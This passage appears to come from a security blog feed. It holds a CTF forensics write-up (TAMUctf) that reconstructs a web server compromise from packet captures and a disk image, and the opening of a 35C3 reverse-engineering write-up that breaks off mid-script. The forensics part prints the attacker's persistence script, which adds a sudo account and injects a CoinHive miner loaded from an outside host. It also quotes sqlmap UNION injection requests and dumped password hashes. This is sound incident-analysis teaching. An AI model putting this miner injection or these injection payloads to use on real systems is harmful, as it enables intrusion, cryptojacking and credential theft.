don’t exist and 200 on the ones that exist… </p><p>So I used a second filter on wireshark to catch the 200 responses, you can do this by doing <strong>EDIT -&gt; Find packet</strong>, after this a bunch of buttons will appear below the first filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/l8MYcVb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/l8MYcVb.png" alt><br></a><br>If you keep clicking on find it will jump to the next <strong>200 OK</strong>, you need to keep looking at the request from the attacker to know which <strong>file</strong> he’s searching and the response of the server to check if is <strong>200 OK</strong>, for example in the image above he did a <strong>GET</strong> request to <strong>/</strong> and received a 200 OK meaning that page exist. So with this I keep clicking find and I got all the files I needed which the list is : </p><p>The answer was:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.html,adminlogin.html,adminlogin.php,contact.html,gallery.html,index.html,services.html,typo.html</span><br></pre></td></tr></table></figure></p><p>With this method I also found an interesting file named backup.sh which will be useful for the next steps:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! id -u devtest2; <span class="keyword">then</span></span><br><span class="line">    mkdir /home/devtest2</span><br><span class="line">    useradd --home=/home/devtest2 -s /bin/bash devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"devtest2:HYf6lEMhUM4Z0b079X"</span> | chpasswd</span><br><span class="line">    chown devtest2:devtest2 /home/devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo cat /var/www/html/index.html | grep <span class="string">"miner.js"</span></span><br><span class="line"><span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">      sed -i <span class="string">'s/&lt;\/body&gt;/&lt;script src = http:\/\/10.187.195.95\/js\/colorbox.min.js&gt;&lt;\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous("123456-asdfgh");color.start()&lt;\/script&gt;&lt;\/body&gt;/g'</span> /var/www/html/index.html</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/lIbTGMO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lIbTGMO.png" alt><br></a></p><h1 id="2-Analysis"><a href="#2-Analysis" class="headerlink" title="2_Analysis"></a>2_Analysis</h1><blockquote><br>Apparently none of the devs knew what were talking about.<br>Thanks to your initial findings it looks like this may have been an outside attack.<br>Using the logs we already gave you can you dig deeper and see if you can find more information? In the meantime we will try and get files for you to look at.<br><br>What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)<br>What is the name of the first tool used?<br>What is the version string of the third tool used?<br>What page was attacked with the third tool?<br><br>2/22 10:49 pm CST updated format on question 1 2/23 12:37 pm CST updated timestamp solution for 1<br><br></blockquote><h3 id="What-time-in-UTC-did-the-initial-scanning-start-mm-dd-yyyy-hh-mm-ss"><a href="#What-time-in-UTC-did-the-initial-scanning-start-mm-dd-yyyy-hh-mm-ss" class="headerlink" title="What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)"></a>What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)</h3><p>This question got me a a lot of time simply because they are asking in UTC time zone , I think Wireshark was showing the name on my timezone so I had the adapt the date by subtracting one hour, we need to find the date when the first SYN request was done we can do this with the initial filter we used:<br><a data-fancybox="gallery" href="https://i.imgur.com/AdI6Q1S.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/AdI6Q1S.png" alt><br></a><br>The correct date was 05/22/2018:19:07:35 , which was subtracted by 1 hour from what Wireshark was giving me for other people probably you would need to do different things depending on you time zone.</p><h3 id="What-is-the-name-of-the-first-tool-used"><a href="#What-is-the-name-of-the-first-tool-used" class="headerlink" title="What is the name of the first tool used?"></a>What is the name of the first tool used?</h3><p>I eventually just tried nmap and immediately got the right answer but there are other ways to detect if nmap was used for scanning, you can read this <a href="http://blog.extremehacking.org/blog/2015/07/22/packet-fingerprinting-with-wireshark-and-detecting-nmap-scans/" target="_blank" rel="noopener">blog post</a> I didn’t used but it’s a really interesting read.</p><h3 id="What-is-the-version-string-of-the-third-tool-used"><a href="#What-is-the-version-string-of-the-third-tool-used" class="headerlink" title="What is the version string of the third tool used?"></a>What is the version string of the third tool used?</h3><p>So we know the second tool used was probably a tool like dir buster to find files on the server, so after finding the existing files is time to check which requests he used on the found files, the more interesting file to look at is the adminlogin.php because it’s a php file and it has communication with the server which was probably the one the attacker used so lets check the user-agent used:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/VQiWZwY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VQiWZwY.png" alt><br></a></p><p>The version string was:<br>sqlmap/1.2.4#stable</p><h3 id="What-page-was-attacked-with-the-third-tool"><a href="#What-page-was-attacked-with-the-third-tool" class="headerlink" title="What page was attacked with the third tool?"></a>What page was attacked with the third tool?</h3><p>This is already answer form the previous question :) the page is <strong>adminlogin.php</strong> .</p><h1 id="3-Forensics"><a href="#3-Forensics" class="headerlink" title="3_Forensics"></a>3_Forensics</h1><blockquote><br><br>Unfortunately it looks like the attackers used pretty standard tools to hack into our website.<br><br>It looks like they didn’t modify the web page from the admin interface on the website though.<br><br>They probably logged into the webserver somehow. Can you see if you can find out how they got credentials to log in?<br><br>1 - List the compromised usernames in comma separated alphabetical order (website users)<br>2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)<br><br></blockquote><h3 id="1-List-the-compromised-usernames-in-comma-separated-alphabetical-order-website-users"><a href="#1-List-the-compromised-usernames-in-comma-separated-alphabetical-order-website-users" class="headerlink" title="1 - List the compromised usernames in comma separated alphabetical order (website users)"></a>1 - List the compromised usernames in comma separated alphabetical order (website users)</h3><p>We already know the attacker used sqlmap for the attack, if you know how sqlmap works it starts by trying alot of queries to find the vulnerability and find the right payload to attack, we can ignore the first requests and start looking at when sqlmap started dumping the database:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/jwlvSLI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jwlvSLI.png" alt><br></a></p><p>So as we can see above the database dumping started at package nr <strong>333806</strong>, and it starts for dumping the database, to understand the rest we need to understand the sql query sqlmap used. So the query used to extract the database name:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span><span class="comment">-- jaLN&amp;password=adsf HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>As you can see he’s using union query to concat two additional strings  0x716b7a6271 and 0x7171627871 if we decode both from hex to string we get: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">'716b7a6271'</span> | xxd -r -p</span><br><span class="line">qkzbq⏎                                                                                                  </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'7171627871'</span> | xxd -r -p</span><br><span class="line">qqbxq⏎</span><br></pre></td></tr></table></figure><p>Sqlmap uses this strings to easily parse content that’s why the output of the request comes very weird like this:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>You logged in as qkzbqSqliDBqqbxq<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Just remove both qkzbq and qqbxq and you get SqliDB which is the database name. Now we don’t really care about the database names and table names so we can skip the next requests and look to when they started dumping the usernames and passwords.</p><p>Request to get the users count number:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> SqliDB.Users<span class="comment">-- qKQB&amp;password=adsf HTTP/1.1\r\n</span></span><br></pre></td></tr></table></figure></p><p>Output of the users number:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 5&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Request to get the 3rd user on the database id, password, username:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /adminlogin.php?username=adsf' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,(<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="number">0x716b7a6271</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">ID</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x797570747270</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">Password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x797570747270</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="string">`User`</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171627871</span>) <span class="keyword">FROM</span> SqliDB.Users <span class="keyword">LIMIT</span> <span class="number">2</span>,<span class="number">1</span>),<span class="literal">NULL</span><span class="comment">-- tpEN&amp;password=adsf HTTP/1.1</span></span><br></pre></td></tr></table></figure></p><p>Output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as qkzbq1yuptrp7a4434d48772fee914a99590376ee438yuptrpadminqqbxq&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Removing the parse strings:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;You logged in as 1 7a4434d48772fee914a99590376ee438 admin&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Now you just do the same for the rest of the queries and you get a list of users:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 7a4434d48772fee914a99590376ee438 admin</span><br><span class="line">2 2e107f8e7aaf178bf00e58c09abfba08 devtest</span><br><span class="line">3 5f836ac3e2ea2b22227c940754283fde suzy</span><br><span class="line">4 442f0577be5c6e59a77047eaa37b15c6 bob</span><br><span class="line">5 5efb309c9b1dc4e90fa136a64e3902e0 alice</span><br></pre></td></tr></table></figure><p>The answer for this question was:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin,alice,bob,devtest,suzy</span><br></pre></td></tr></table></figure></p><h3 id="2-What-username-and-password-combo-were-the-attackers-most-likely-able-to-get-a-hold-of-format-as-username-password"><a href="#2-What-username-and-password-combo-were-the-attackers-most-likely-able-to-get-a-hold-of-format-as-username-password" class="headerlink" title="2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)"></a>2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)</h3><p>Since we got the list of users and passwords the only one was searchable on the internet was devtest md5 hash the password of devtest was driveby so the answer to this question is:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devtest:driveby</span><br></pre></td></tr></table></figure><h1 id="4-privilege-escalation"><a href="#4-privilege-escalation" class="headerlink" title="4_privilege_escalation"></a>4_privilege_escalation</h1><blockquote><br><br>We will have to get on to the devs for leaving that account on the website and machine.<br><br>Some good news is that we finally obtained a disk image of the machine.<br><br>If the attacker modified the web files on the server they must have had higher privileges than the account you found.<br><br>See if you can find some information about how they could have done so.<br><br>Link to disk image (10 GB unzipped)<br><br>What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?<br>What account were the attackers able to escalate to?<br>What is the password for that account?<br><br><br></blockquote><h3 id="What-is-the-md5sum-of-the-file-that-was-most-likely-used-or-found-by-the-attackers-to-get-higher-privileges"><a href="#What-is-the-md5sum-of-the-file-that-was-most-likely-used-or-found-by-the-attackers-to-get-higher-privileges" class="headerlink" title="What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?"></a>What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?</h3><p>After mounting the the image:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/rofl</span><br><span class="line">sudo mount -o ro,noload,noexec filesystem.image /mnt/rofl</span><br></pre></td></tr></table></figure><p>So after checking the home folder of ubuntu user i saw that setup.sh had read permissions for everyone on that setup.sh file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -ltah home/ubuntu/</span><br><span class="line">total 28K</span><br><span class="line">drwxr-xr-x 6 root    root    4.0K May 22  2018 ../</span><br><span class="line">drwxr-xr-x 3    1001 pcap    4.0K May 22  2018 ./</span><br><span class="line">-rwxrwxr-x 1 evilgod evilgod  695 May 22  2018 setup.sh*</span><br><span class="line">drwx------ 2    1001 pcap    4.0K May 22  2018 .ssh/</span><br><span class="line">-rw-r--r-- 1    1001 pcap     655 May 16  2017 .profile</span><br><span class="line">-rw-r--r-- 1    1001 pcap     220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1    1001 pcap    3.7K Sep  1  2015 .bashrc</span><br></pre></td></tr></table></figure><p>Any user could read this file so after checking the content of it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ cat home/ubuntu/setup.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBIAN_FRONTEND=<span class="string">"noninteractive"</span></span><br><span class="line"></span><br><span class="line">sudo apt-get -y update &amp;&amp; apt-get install -y apache2 apache2-doc apache2-utils mysql-server php libapache2-mod-php php-mcrypt php-mysql python</span><br><span class="line"></span><br><span class="line">sudo sed -i <span class="string">'s/PasswordAuthentication no/PasswordAuthentication yes/g'</span> /etc/ssh/sshd_config</span><br><span class="line">sudo sed -i <span class="string">'s/StrictModes yes/#StrictModes yes/g'</span> /etc/ssh/sshd_config</span><br><span class="line">sudo service ssh restart</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">"root:0A0YlBjrlBXSr14MPz"</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_GROUP=www-data</span><br><span class="line"><span class="built_in">export</span> APACHE_PID_FILE=/var/run/apache2.pid</span><br><span class="line"><span class="built_in">export</span> APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line"><span class="built_in">export</span> APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line"><span class="built_in">export</span> APACHE_LOG_DIR=/var/<span class="built_in">log</span>/apache2</span><br><span class="line"></span><br><span class="line">sudo service apache2 restart;</span><br></pre></td></tr></table></figure></p><p>The root password was there so this is how the attacker got privilege escalation, the answer to this question was:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ md5sum home/ubuntu/setup.sh</span><br><span class="line">93b74abb459cdd93bd254302fba4dfdf  home/ubuntu/setup.sh</span><br></pre></td></tr></table></figure><h3 id="What-account-were-the-attackers-able-to-escalate-to"><a href="#What-account-were-the-attackers-able-to-escalate-to" class="headerlink" title="What account were the attackers able to escalate to?"></a>What account were the attackers able to escalate to?</h3><p>The answer is pretty simple the account was <strong>root</strong>.</p><h3 id="What-is-the-password-for-that-account"><a href="#What-is-the-password-for-that-account" class="headerlink" title="What is the password for that account?"></a>What is the password for that account?</h3><p>The password is what we found on the file before which is <strong>0A0YlBjrlBXSr14MPz</strong></p><h1 id="5-persistence"><a href="#5-persistence" class="headerlink" title="5_persistence"></a>5_persistence</h1><blockquote><br><br>Thanks for finding that information out.<br>We have since changed the password for that account.<br>Looks like we might have to spend a few days putting our employees through some security training.<br>Unfortunately since deleting the malicous links off of our home page they have reappeared again.<br><br>Can you figure out how the attacker was able to re infect our home page?<br><br>1. What is the md5sum of the file the attacker is using for persistence?<br>2. What account was created?<br>3. What group did the attacker add the account to?<br>4. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)<br><br><br></blockquote><h3 id="What-is-the-md5sum-of-the-file-the-attacker-is-using-for-persistence"><a href="#What-is-the-md5sum-of-the-file-the-attacker-is-using-for-persistence" class="headerlink" title="What is the md5sum of the file the attacker is using for persistence?"></a>What is the md5sum of the file the attacker is using for persistence?</h3><p>Remember the file we found on <strong>1_logs</strong> ? that’s what he was using for persistence, this file is located in the root directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ md5sum root/backup.sh</span><br><span class="line">29ff58b6607c824451349183a570cc6c  root/backup.sh</span><br></pre></td></tr></table></figure><p>The answer was 29ff58b6607c824451349183a570cc6c</p><h3 id="What-account-was-created"><a href="#What-account-was-created" class="headerlink" title="What account was created?"></a>What account was created?</h3><p>We could easily see this by just looking at the backup.sh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! id -u devtest2; <span class="keyword">then</span></span><br><span class="line">    mkdir /home/devtest2</span><br><span class="line">    useradd --home=/home/devtest2 -s /bin/bash devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"devtest2:HYf6lEMhUM4Z0b079X"</span> | chpasswd</span><br><span class="line">    chown devtest2:devtest2 /home/devtest2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo cat /var/www/html/index.html | grep <span class="string">"miner.js"</span></span><br><span class="line"><span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">      sed -i <span class="string">'s/&lt;\/body&gt;/&lt;script src = http:\/\/10.187.195.95\/js\/colorbox.min.js&gt;&lt;\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous("123456-asdfgh");color.start()&lt;\/script&gt;&lt;\/body&gt;/g'</span> /var/www/html/index.html</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>The user created was <strong>devtest2</strong>, alternatively we could also look at auth.log file and see:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat var/<span class="built_in">log</span>/auth.log</span><br><span class="line">... [truncated]</span><br><span class="line">May 22 19:11:40 ubuntu-xenial useradd[12186]: new group: name=devtest2, GID=1003</span><br><span class="line">May 22 19:11:40 ubuntu-xenial useradd[12186]: new user: name=devtest2, UID=1003, GID=1003, home=/home/devtest2, shell=/bin/bash</span><br><span class="line">May 22 19:11:40 ubuntu-xenial chpasswd[12192]: pam_unix(chpasswd:chauthtok): password changed <span class="keyword">for</span> devtest2</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/bin/cat /var/www/html/index.html</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">May 22 19:11:40 ubuntu-xenial sshd[12140]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">May 22 19:11:40 ubuntu-xenial systemd-logind[1046]: Removed session 4.</span><br></pre></td></tr></table></figure><p>So the answer was <strong>devtest2</strong></p><h3 id="What-group-did-the-attacker-add-the-account-to"><a href="#What-group-did-the-attacker-add-the-account-to" class="headerlink" title="What group did the attacker add the account to?"></a>What group did the attacker add the account to?</h3><p>We can get this answer from the backup.sh file from the line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'devtest2  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><p>The group he added was sudoers group, so the answer was <strong>sudoers</strong>.</p><h3 id="What-time-of-day-does-the-attacker-reinfect-the-machine-use-24-hr-notation-ex-0100-for-1-am"><a href="#What-time-of-day-does-the-attacker-reinfect-the-machine-use-24-hr-notation-ex-0100-for-1-am" class="headerlink" title="What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)"></a>What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)</h3><p>So the attacker is using something to automate the script every day, so the first thing that came to my mind was <strong>crontab</strong> so I just checked the scripts running on crontab from the <strong>root</strong> user you can find it on the directory <strong>var/spool/cron/crontabs/</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls var/spool/cron/crontabs/</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>Now seeing the file:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat var/spool/cron/crontabs/root</span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (- installed on Tue May 22 19:11:40 2018)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line">30 2 * * 0 root /root/backup.sh &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>Then I used this <a href="https://crontab.guru/" target="_blank" rel="noopener">website</a> to translate those crontab numbers because I was way too lazy to check out how it works (copied the beginning string of 30 2 <em> </em> 0):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/3cwyVVK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3cwyVVK.png" alt><br></a></p><p>Translation to the 24h notation the answer is <strong>0230</strong>.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0-intrusion&quot;&gt;&lt;a href=&quot;#0-intrusion&quot; class=&quot;headerlink&quot; title=&quot;0_intrusion&quot;&gt;&lt;/a&gt;0_intrusion&lt;/h1&gt;&lt;blockquote&gt;&lt;br&gt;0_intrusion&lt;br&gt;100&lt;br
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="TAMUctf" scheme="https://teamrocketist.github.io/tags/TAMUctf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 35C3 - corebot</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/</id>
    <published>2018-12-30T10:36:09.000Z</published>
    <updated>2018-12-30T11:55:41.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    Solves: 97<br><br>    <a href="https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6</a><br><br>    Difficulty estimate: easy<br><br>    Guest challenge by Jesko / rattle.<br><br>    UPDATE: Challenge binary replaced. Apologies for the inconvenience.<br></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>Identify which encryption algorithm is being used.</li><li>Extract the encrypted data from PE resources.</li><li>Brute-force the last bytes of the serial volume key.</li><li>Generate the key with the serial.</li><li>Decrypt the data and obtain the flag.</li></ul><h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>So we got a windows binary that uses CryptoAPI from Microsoft first thing to do is to open the binary in IDA a check the start function:<br><a data-fancybox="gallery" href="https://i.imgur.com/Gr1QEb4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Gr1QEb4.png" alt><br></a><br>So after creating the key for AES the program will import the key handle following by decrypting the loaded encrypted data from the PE resources as it is explained in the image bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/9lPKuxO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9lPKuxO.png" alt><br></a><br>As I explained in the image above if you inspect the sub_11B1146 you will see it’s using the <strong>LoadResources</strong> function to <strong>extract data</strong> from the PE executable, this data happens to be the encrypted data. We can extract this data in two ways, either with dynamic analysis or with a tool to extract resources from windows binaries in my case i used <a href="https://www.systutorials.com/docs/linux/man/1-wrestool/" target="_blank" rel="noopener">wrestool</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wrestool --raw -x corebot-640d3c582340e647d72e1dd9418a3fd6 | xxd</span><br><span class="line">00000000: 1029 b845 9d2a ab93 fe89 fb82 9342 a18c  .).E.*.......B..</span><br><span class="line">00000010: 2e90 6300 0611 8064 b821 c29f 35e7 7ef2  ..c....d.!..5.~.</span><br></pre></td></tr></table></figure><p>Now that we got the encrypted data we need to find a way to decrypt the data, since the key was created with challenge creator <strong>volume serial</strong> we need to brute force it, since it’s only using the lower bytes of the serial we only need to brute force two bytes.</p><p>Time to write a script to bruteforce the serial and decrypt:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span 